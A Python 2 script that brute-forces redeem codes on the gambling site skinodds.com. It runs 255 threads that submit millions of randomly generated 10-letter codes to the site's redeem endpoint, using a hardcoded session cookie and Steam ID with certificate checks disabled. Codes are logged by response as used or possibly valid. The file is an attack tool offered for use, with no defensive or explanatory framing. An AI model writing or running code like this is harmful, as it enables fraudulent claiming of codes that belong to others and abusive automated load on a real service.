# -*- coding: utf-8 -*-
import requests
import re
import Queue
import random
import codecs
import string
from threading import Thread

proxy = '127.0.0.1:8888'
requests.packages.urllib3.disable_warnings()

with codecs.open('Proxies Working.txt', 'r', encoding='utf-8') as f:
	proxies = f.readlines()
	
def check(q):
	while True:
		try:
			code = q.get()
			prozy = {
				'http': proxy.strip(),
				'https': proxy.strip()
			}
			s = requests.session()
			headers = {
				'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.97 Safari/537.36',
				'Accept-Encoding': 'gzip',
				'Content-Type': 'application/x-www-form-urlencoded',
				'Accept': 'application/json, text/javascript, */*; q=0.01',
				'X-Requested-With': 'XMLHttpRequest',
				'Cookie': '__cfduid=d52c2388062b0b4c29d58bec195bd8cac1487095126; lang=en; PHPSESSID=da315ebbde8c1e7cff6d6d7678d4fa66; _gat=1; _hjIncludedInSample=1; _ga=GA1.2.427988355.1487095127'
			}
			r = s.post(
						'https://skinodds.com/ajax/redeem2.php',
						data='code={0}&steamID=76561198282258253'.format(code),
						verify=False,
						#proxies=prozy,
						timeout=12,
						headers=headers
					)
			if '3' in r.text:
				f = open("used.txt", "a")
				f.write('{0}\n'.format(code))
				f.close()
				print "Code 3:", code
			elif '7' in r.text:
				pass
			else:
				f = open("maybe.txt", "a")
				f.write('{0}\n{1}\n\n\n'.format(code, r.text))
				f.close()
				print r.text
			q.task_done()
		except Exception, e:
			print e
			pass
	
def main():
	queue = Queue.Queue()
	ul = string.ascii_lowercase + string.ascii_uppercase
	for _ in range(int(255)):
		worker = Thread(target=check, args=(queue,))
		worker.start()
	for _ in xrange(9999999):
		c = 0
		if random.randint(0,1) is 1:
			while c is not 5:
				l = ''.join(random.choice(ul) for _ in range(10))
				c = 0
				for i in l:
					if i.isupper():
						c += 1
			queue.put(l)
		else:
			while c is not 4:
				l = ''.join(random.choice(ul) for _ in range(10))
				c = 0
				for i in l:
					if i.isupper():
						c += 1
			queue.put(l)
if __name__ == '__main__':
	main()